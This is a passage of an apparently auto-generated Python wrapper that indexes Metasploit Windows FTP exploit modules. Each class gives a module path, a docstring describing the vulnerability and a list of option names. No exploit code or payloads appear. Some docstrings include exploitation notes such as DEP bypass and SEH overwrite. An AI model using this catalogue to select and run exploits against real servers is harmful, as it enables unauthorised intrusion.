        Please note that this module currently only works for Windows before Vista.
      
		"""

		path = 'windows/ftp/open_ftpd_wbem'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_PATH = 'PATH'

	class windows_ftp_warftpd_165_user(object):
		"""
		
          This module exploits a buffer overflow found in the USER command
        of War-FTPD 1.65.
      
		"""

		path = 'windows/ftp/warftpd_165_user'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_trellian_client_pasv(object):
		"""
		
          This module exploits a buffer overflow in the Trellian 3.01 FTP client that is triggered
        through an excessively long PASV message.
      
		"""

		path = 'windows/ftp/trellian_client_pasv'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ftp_leapftp_list_reply(object):
		"""
		
          This module exploits a buffer overflow in the LeapFTP 3.0.1 client.
        This issue is triggered when a file with a long name is downloaded/opened.
      
		"""

		path = 'windows/ftp/leapftp_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_comsnd_ftpd_fmtstr(object):
		"""
		
          This module exploits the ComSndFTP FTP Server version 1.3.7 beta by sending a specially
        crafted format string specifier as a username. The crafted username is sent to to the server to
        overwrite the hardcoded function pointer from Ws2_32.dll!WSACleanup. Once this function pointer
        is triggered, the code bypasses dep and then repairs the pointer to execute arbitrary code.
        The SEH exit function is preferred so that the administrators are not left with an unhandled
        exception message. When using the meterpreter payload, the process will never die, allowing
        for continuous exploitation.
      
		"""

		path = 'windows/ftp/comsnd_ftpd_fmtstr'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ftp_ftpsynch_list_reply(object):
		"""
		
          This module exploits a stack buffer overflow vulnerability in FTP Synchronizer Pro
        version 4.0.73.274 The overflow gets triggered by sending an overly long filename to
        the client in response to a LIST command.
        The LIST command gets issued when doing a preview or when you have just created a new
        sync profile and allow the tool to see the differences.
        This will overwrite a structured exception handler and trigger an access violation.
      
		"""

		path = 'windows/ftp/ftpsynch_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_freeftpd_user(object):
		"""
		
          This module exploits a stack buffer overflow in the freeFTPd
        multi-protocol file transfer service. This flaw can only be
        exploited when logging has been enabled (non-default).
      
		"""

		path = 'windows/ftp/freeftpd_user'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_ftp_cesarftp_mkd(object):
		"""
		
        This module exploits a stack buffer overflow in the MKD verb in CesarFTP 0.99g.

        You must have valid credentials to trigger this vulnerability. Also, you
        only get one chance, so choose your target carefully.
      
		"""

		path = 'windows/ftp/cesarftp_mkd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_servu_chmod(object):
		"""
		
        This module exploits a stack buffer overflow in the site chmod command
        in versions of Serv-U FTP Server prior to 4.2.

        You must have valid credentials to trigger this vulnerability. Exploitation
        also leaves the service in a non-functional state.
      
		"""

		path = 'windows/ftp/servu_chmod'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_gekkomgr_list_reply(object):
		"""
		
          This module exploits a buffer overflow in Gekko Manager ftp client, triggered when
        processing the response received after sending a LIST request. If this response contains
        a long filename, a buffer overflow occurs, overwriting a structured exception handler.
      
		"""

		path = 'windows/ftp/gekkomgr_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_ftppad_list_reply(object):
		"""
		
          This module exploits a stack buffer overflow FTPPad 1.2.0 ftp client. The overflow is
        triggered when the client connects to a FTP server which sends an overly long directory
        and filename in response to a LIST command.

        This will cause an access violation, and will eventually overwrite the saved extended
        instruction pointer.  Payload can be found at EDX+5c and ESI+5c, so a little pivot/
        sniper was needed to make this one work.
      
		"""

		path = 'windows/ftp/ftppad_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_leapftp_pasv_reply(object):
		"""
		
          This module exploits a buffer overflow in the LeapWare LeapFTP v2.7.3.600
        client that is triggered through an excessively long PASV reply command. This
        module was ported from the original exploit by drG4njubas with minor improvements.
      
		"""

		path = 'windows/ftp/leapftp_pasv_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'
			required_SRVNAME = 'SRVNAME'

	class windows_ftp_wsftp_server_505_xmd5(object):
		"""
		
          This module exploits a buffer overflow in the XMD5 verb in
        IPSWITCH WS_FTP Server 5.05.
      
		"""

		path = 'windows/ftp/wsftp_server_505_xmd5'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_32bitftp_list_reply(object):
		"""
		
          This module exploits a stack buffer overflow in 32bit ftp client, triggered when trying to
          download a file that has an overly long filename.
      
		"""

		path = 'windows/ftp/32bitftp_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_httpdx_tolog_format(object):
		"""
		
          This module exploits a format string vulnerability in HTTPDX FTP server.
        By sending an specially crafted FTP command containing format specifiers, an
        attacker can corrupt memory and execute arbitrary code.

        By default logging is off for HTTP, but enabled for the 'moderator' user
        via FTP.
      
		"""

		path = 'windows/ftp/httpdx_tolog_format'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_sami_ftpd_list(object):
		"""
		
          This module exploits a stack based buffer overflow on Sami FTP Server 2.0.1.
        The vulnerability exists in the processing of LIST commands. In order to trigger
        the vulnerability, the "Log" tab must be viewed in the Sami FTP Server managing
        application, in the target machine. On the other hand, the source IP address used
        to connect with the FTP Server is needed. If the user can't provide it, the module
        will try to resolve it. This module has been tested successfully on Sami FTP Server
        2.0.1 over Windows XP SP3.
      
		"""

		path = 'windows/ftp/sami_ftpd_list'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			SOURCEIP = 'SOURCEIP'

	class windows_ftp_quickshare_traversal_write(object):
		"""
		
          This module exploits a vulnerability found in QuickShare File Server's FTP
        service.  By supplying "../" in the file path, it is possible to trigger a
        directory traversal flaw, allowing the attacker to read a file outside the
        virtual directory.  By default, the "Writable" option is enabled during account
        creation, therefore this makes it possible to create a file at an arbitrary
        location, which leads to remote code execution.
      
		"""

		path = 'windows/ftp/quickshare_traversal_write'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_ftp_ms09_053_ftpd_nlst(object):
		"""
		
          This module exploits a stack buffer overflow flaw in the Microsoft IIS FTP
        service. The flaw is triggered when a special NLST argument is passed
        while the session has changed into a long directory path. For this exploit
        to work, the FTP server must be configured to allow write access to the
        file system (either anonymously or in conjunction with a real account)
      
		"""

		path = 'windows/ftp/ms09_053_ftpd_nlst'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_warftpd_165_pass(object):
		"""
		
          This exploits the buffer overflow found in the PASS command
        in War-FTPD 1.65. This particular module will only work
        reliably against Windows 2000 targets. The server must be
        configured to allow anonymous logins for this exploit to
        succeed. A failed attempt will bring down the service
        completely.
      
		"""

		path = 'windows/ftp/warftpd_165_pass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_turboftp_port(object):
		"""
		
        This module exploits a buffer overflow vulnerability found in the PORT
        command in Turbo FTP Server 1.30.823 & 1.30.826, which results in remote
        code execution under the context of SYSTEM.
      
		"""

		path = 'windows/ftp/turboftp_port'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_filecopa_list_overflow(object):
		"""
		
          This module exploits the buffer overflow found in the LIST command
        in fileCOPA FTP server pre 18 Jul 2006 version discovered by www.appsec.ch
      
		"""

		path = 'windows/ftp/filecopa_list_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_xftp_client_pwd(object):
		"""
		
          This module exploits a buffer overflow in the Xftp 3.0 FTP client that is triggered
        through an excessively long PWD message.
      
		"""

		path = 'windows/ftp/xftp_client_pwd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SRVNAME = 'SRVNAME'

	class windows_ftp_odin_list_reply(object):
		"""
		
          This module exploits a stack buffer overflow in Odin Secure FTP 4.1,
        triggered when processing the response on a LIST command. During the overflow,
        a structured exception handler record gets overwritten.
      
		"""

		path = 'windows/ftp/odin_list_reply'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			PASVPORT = 'PASVPORT'

	class windows_ftp_wftpd_size(object):
		"""
		
          This module exploits a buffer overflow in the SIZE verb in
        Texas Imperial's Software WFTPD 3.23.
      
		"""

		path = 'windows/ftp/wftpd_size'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_slimftpd_list_concat(object):
		"""
		
          This module exploits a stack buffer overflow in the SlimFTPd
        server. The flaw is triggered when a LIST command is
        received with an overly-long argument. This vulnerability
        affects all versions of SlimFTPd prior to 3.16 and was
        discovered by Raphael Rigo.
      
		"""

		path = 'windows/ftp/slimftpd_list_concat'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_easyftp_cwd_fixret(object):
		"""
		
          This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11
        and earlier. EasyFTP fails to check input size when parsing 'CWD' commands, which
        leads to a stack based buffer overflow.  EasyFTP allows anonymous access by
        default; valid credentials are typically unnecessary to exploit this vulnerability.

        After version 1.7.0.12, this package was renamed "UplusFtp".

        This exploit utilizes a small piece of code that I/'ve referred to as 'fixRet'.
        This code allows us to inject of payload of ~500 bytes into a 264 byte buffer by
        'fixing' the return address post-exploitation.  See references for more information.
      
		"""

		path = 'windows/ftp/easyftp_cwd_fixret'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			FTPUSER = 'FTPUSER'
			FTPPASS = 'FTPPASS'
			required_FTPTimeout = 'FTPTimeout'
			FTPDEBUG = 'FTPDEBUG'

	class windows_ftp_sasser_ftpd_port(object):
		"""
		
          This module exploits the FTP server component of the Sasser worm.
        By sending an overly long PORT command the stack can be overwritten.
      
		"""

		path = 'windows/ftp/sasser_ftpd_port'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
